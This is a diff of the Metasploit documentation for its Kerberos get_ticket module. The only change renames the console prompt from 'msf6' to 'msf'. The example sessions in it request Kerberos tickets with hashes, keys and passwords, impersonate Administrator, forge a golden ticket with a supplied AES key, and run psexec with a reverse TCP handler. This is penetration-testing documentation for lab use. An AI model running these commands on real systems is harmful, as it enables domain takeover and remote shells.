@@ -87,25 +87,25 @@ The Kerberos TGT to use when requesting the service ticket. If unset, the databa
 An example of viewing the Kerberos ticket cache, and requesting a TGT with NT hash:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > klist
+msf auxiliary(admin/kerberos/get_ticket) > klist
 Kerberos Cache
 ==============
 No tickets
 
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator nthash=<redacted> action=GET_TGT
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator nthash=<redacted> action=GET_TGT
 [*] Running module against 10.0.0.24
 
 [+] 10.0.0.24:88 - Received a valid TGT-Response
 [*] 10.0.0.24:88 - TGT MIT Credential Cache saved on /home/msfuser/.msf4/loot/20221104181416_default_10.0.0.24_mit.kerberos.cca_912121.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > klist
+msf auxiliary(admin/kerberos/get_ticket) > klist
 Kerberos Cache
 ==============
 host            principal                 sname                         issued                     status  path
 ----            ---------                 -----                         ------                     ------  ----
 192.168.123.13  Administrator@ADF3.LOCAL  krbtgt/ADF3.LOCAL@ADF3.LOCAL  2023-01-12 19:37:54 +0000  valid   /Users/usr/.msf4/loot/20230112193756_default_192.168.123.13_mit.kerberos.cca_131390.bin
  
-msf6 auxiliary(admin/kerberos/get_ticket) > hosts
+msf auxiliary(admin/kerberos/get_ticket) > hosts
 
 Hosts
 =====
@@ -114,7 +114,7 @@ address          mac  name  os_name  os_flavor  os_sp  purpose  info  comments
 -------          ---  ----  -------  ---------  -----  -------  ----  --------
 10.0.0.24                   Unknown                    device
 
-msf6 auxiliary(admin/kerberos/get_ticket) > services
+msf auxiliary(admin/kerberos/get_ticket) > services
 Services
 ========
 
@@ -126,7 +126,7 @@ host             port  proto  name      state  info
 TGT with encryption key
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator AES_KEY=<redacted> action=GET_TGT
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator AES_KEY=<redacted> action=GET_TGT
 [*] Running module against 10.0.0.24
 
 [*] 10.0.0.24:88 - Getting TGT for Administrator@mylab.local
@@ -138,7 +138,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 TGT with password
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator password=<redacted> action=GET_TGT
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator password=<redacted> action=GET_TGT
 [*] Running module against 10.0.0.24
 
 [*] 10.0.0.24:88 - Getting TGT for Administrator@mylab.local
@@ -150,14 +150,14 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 TGT with certificate
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 cert_file=/home/msfuser/.msf4/loot/20230124155521_default_10.0.0.24_windows.ad.cs_384669.pfx action=GET_TGT
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 cert_file=/home/msfuser/.msf4/loot/20230124155521_default_10.0.0.24_windows.ad.cs_384669.pfx action=GET_TGT
 [*] Running module against 10.0.0.24
 
 [*] 10.0.0.24:88 - Getting TGT for Administrator@mylab.local
 [+] 10.0.0.24:88 - Received a valid TGT-Response
 [*] 10.0.0.24:88 - TGT MIT Credential Cache ticket saved to /home/msfuser/.msf4/loot/20230124155555_default_192.168.159.10_mit.kerberos.cca_702818.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) >
+msf auxiliary(admin/kerberos/get_ticket) >
 ```
 
 ### Requesting a TGS
@@ -165,7 +165,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) >
 TGS with NT hash:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator nthash=<redacted> action=GET_TGS spn=cifs/dc02.mylab.local
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator nthash=<redacted> action=GET_TGS spn=cifs/dc02.mylab.local
 [*] Running module against 10.0.0.24
 
 [+] 10.0.0.24:88 - Received a valid TGT-Response
@@ -173,7 +173,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 [+] 10.0.0.24:88 - Received a valid TGS-Response
 [*] 10.0.0.24:88 - TGS MIT Credential Cache saved to /home/msfuser/.msf4/loot/20221104182601_default_10.0.0.24_mit.kerberos.cca_883314.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > loot
+msf auxiliary(admin/kerberos/get_ticket) > loot
 
 Loot
 ====
@@ -187,7 +187,7 @@ host             service  type                 name  content                   i
 TGS with encryption key:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator AES_KEY=<redacted> action=GET_TGS spn=cifs/dc02.mylab.local
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator AES_KEY=<redacted> action=GET_TGS spn=cifs/dc02.mylab.local
 [*] Running module against 10.0.0.24
 
 [+] 10.0.0.24:88 - Received a valid TGT-Response
@@ -200,7 +200,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 TGS with password:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator password=<redacted> action=GET_TGS spn=cifs/dc02.mylab.local
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator password=<redacted> action=GET_TGS spn=cifs/dc02.mylab.local
 [*] Running module against 10.0.0.24
 
 [+] 10.0.0.24:88 - Received a valid TGT-Response
@@ -213,7 +213,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 TGS with cached TGT:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > loot
+msf auxiliary(admin/kerberos/get_ticket) > loot
 
 Loot
 ====
@@ -223,7 +223,7 @@ host             service  type                 name  content                   i
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: krbtgt/mylab.local, username: administrator     /home/msfuser/.msf4/loot/20221104183244_default_10.0.0.24_mit.kerberos.cca_171694.bin
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: cifs/dc02.mylab.local, username: administrator  /home/msfuser/.msf4/loot/20221104183244_default_10.0.0.24_mit.kerberos.cca_360960.bin
 
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator action=GET_TGS spn=cifs/dc02.mylab.local
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator action=GET_TGS spn=cifs/dc02.mylab.local
 [*] Running module against 10.0.0.24
 
 [*] 10.0.0.24:88 - Using cached credential for krbtgt/mylab.local Administrator
@@ -235,7 +235,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 TGS without cached TGT:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > loot
+msf auxiliary(admin/kerberos/get_ticket) > loot
 
 Loot
 ====
@@ -245,12 +245,12 @@ host             service  type                 name  content                   i
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: krbtgt/mylab.local, username: administrator     /home/msfuser/.msf4/loot/20221104183244_default_10.0.0.24_mit.kerberos.cca_171694.bin
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: cifs/dc02.mylab.local, username: administrator  /home/msfuser/.msf4/loot/20221104183244_default_10.0.0.24_mit.kerberos.cca_360960.bin
 
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator action=GET_TGS spn=cifs/dc02.mylab.local KrbUseCachedCredentials=false
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator action=GET_TGS spn=cifs/dc02.mylab.local KrbUseCachedCredentials=false
 [*] Running module against 10.0.0.24
 
 [-] Auxiliary aborted due to failure: unknown: Error while requesting a TGT: Kerberos Error - KDC_ERR_PREAUTH_REQUIRED (25) - Additional pre-authentication required - Check the authentication-related options (PASSWORD, NTHASH or AES_KEY)
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator action=GET_TGS spn=cifs/dc02.mylab.local KrbUseCachedCredentials=false password=<redacted>
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=Administrator action=GET_TGS spn=cifs/dc02.mylab.local KrbUseCachedCredentials=false password=<redacted>
 [*] Running module against 10.0.0.24
 
 [+] 10.0.0.24:88 - Received a valid TGT-Response
@@ -258,7 +258,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 [+] 10.0.0.24:88 - Received a valid TGS-Response
 [*] 10.0.0.24:88 - TGS MIT Credential Cache saved to /home/msfuser/.msf4/loot/20221104183538_default_10.0.0.24_mit.kerberos.cca_849639.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > loot
+msf auxiliary(admin/kerberos/get_ticket) > loot
 
 Loot
 ====
@@ -274,7 +274,7 @@ host             service  type                 name  content                   i
 TGS impersonating the Administrator account:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=serviceA password=123456 action=GET_TGS spn=cifs/dc02.mylab.local impersonate=Administrator
+msf auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local username=serviceA password=123456 action=GET_TGS spn=cifs/dc02.mylab.local impersonate=Administrator
 [*] Running module against 10.0.0.24
 
 [*] 10.0.0.24:88 - Getting TGS impersonating Administrator@mylab.local (SPN: cifs/dc02.mylab.local)
@@ -284,7 +284,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 do
 [+] 10.0.0.24:88 - Received a valid TGS-Response
 [*] 10.0.0.24:88 - TGS MIT Credential Cache saved to /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_757041.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > loot
+msf auxiliary(admin/kerberos/get_ticket) > loot
 
 Loot
 ====
@@ -299,7 +299,7 @@ TGS using a previously forged golden ticket:
 
 ```
 # Forge a golden ticket
-msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN aes_key=dac659cec15c80bb2bc8b26cdd3f29076cff84da7ab7ec6cf9dfc2cafa33e087 domain_sid=S-1-5-21-2771926996-166873999-4256077803 domain=dev.demo.local spn=krbtgt/DEV.DEMO.LOCAL user=Administrator
+msf auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN aes_key=dac659cec15c80bb2bc8b26cdd3f29076cff84da7ab7ec6cf9dfc2cafa33e087 domain_sid=S-1-5-21-2771926996-166873999-4256077803 domain=dev.demo.local spn=krbtgt/DEV.DEMO.LOCAL user=Administrator
 
 [*] TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin
 [*] Auxiliary module execution completed
@@ -307,7 +307,7 @@ msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN aes_key=da
 
 # Request a silver ticket:
 
-msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhosts=10.10.11.5 Krb5Ccname=/Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin username=Administrator domain=dev.demo.local spn=cifs/dc02.dev.demo.local
+msf auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhosts=10.10.11.5 Krb5Ccname=/Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin username=Administrator domain=dev.demo.local spn=cifs/dc02.dev.demo.local
 [*] Running module against 10.10.11.5
 
 [*] 10.10.11.5:88 - Using cached credential for krbtgt/DEV.DEMO.LOCAL@DEV.DEMO.LOCAL Administrator@DEV.DEMO.LOCAL
@@ -319,7 +319,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhosts=10.10.11.5
 
 # Use psexec:
 
-msf6 exploit(windows/smb/psexec) > run rhost=10.10.11.5 smbdomain=dev.demo.local username=Administrator smb::auth=kerberos smb::krb5ccname=/Users/user/.msf4/loot/20230309120802_default_10.10.11.5_mit.kerberos.cca_352530.bin smb::rhostname=dc02.dev.demo.local domaincontrollerrhost=10.10.11.5 lhost=192.168.123.1
+msf exploit(windows/smb/psexec) > run rhost=10.10.11.5 smbdomain=dev.demo.local username=Administrator smb::auth=kerberos smb::krb5ccname=/Users/user/.msf4/loot/20230309120802_default_10.10.11.5_mit.kerberos.cca_352530.bin smb::rhostname=dc02.dev.demo.local domaincontrollerrhost=10.10.11.5 lhost=192.168.123.1
 
 [*] Started reverse TCP handler on 192.168.123.1:4444
 [*] 10.10.11.5:445 - Connecting to the server...
